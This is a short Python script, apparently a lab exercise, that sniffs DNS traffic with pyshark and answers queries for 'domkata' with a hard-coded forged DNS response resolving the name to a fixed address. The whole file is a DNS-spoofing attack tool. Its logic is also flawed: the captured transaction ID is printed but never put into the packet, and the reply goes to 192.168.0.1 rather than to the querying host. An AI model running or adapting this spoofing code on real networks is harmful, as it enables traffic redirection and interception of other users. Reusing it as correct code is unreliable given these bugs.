import re
import socket

import pyshark

cap = pyshark.LiveCapture(interface='enp2s0', bpf_filter='udp port 53')
cap.sniff(packet_count=10)

UDP_IP = "192.168.0.1"
UDP_PORT = 53
MESSAGE = "64668180000100010000000107646f6d6b61746103636f6d0000010001c00c0001000100000e100004332686b20000290200000000000000"

def fake_dns_response(id):
    print("UDP target IP:", UDP_IP)
    print("UDP target port:", UDP_PORT)
    print("message:", id + MESSAGE)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(bytes.fromhex(MESSAGE), (UDP_IP, UDP_PORT))


def is_domkata_dns_request(pkt):
    print(pkt)
    return "domkata" in str(pkt)


def get_transaction_id(pkt):
    return re.search("Transaction ID: 0x(....)", str(pkt)).group(1)


def is_localhost(pkt):
    print(pkt)
    search = re.search("Source: 192.168.0.1\n", str(pkt))
    print(search)
    return search


def print_dns_info(pkt):
    if is_domkata_dns_request(pkt) and not is_localhost(pkt):
        id = get_transaction_id(pkt)
        fake_dns_response(id)
        exit(1)

cap.apply_on_packets(print_dns_info, timeout=100)
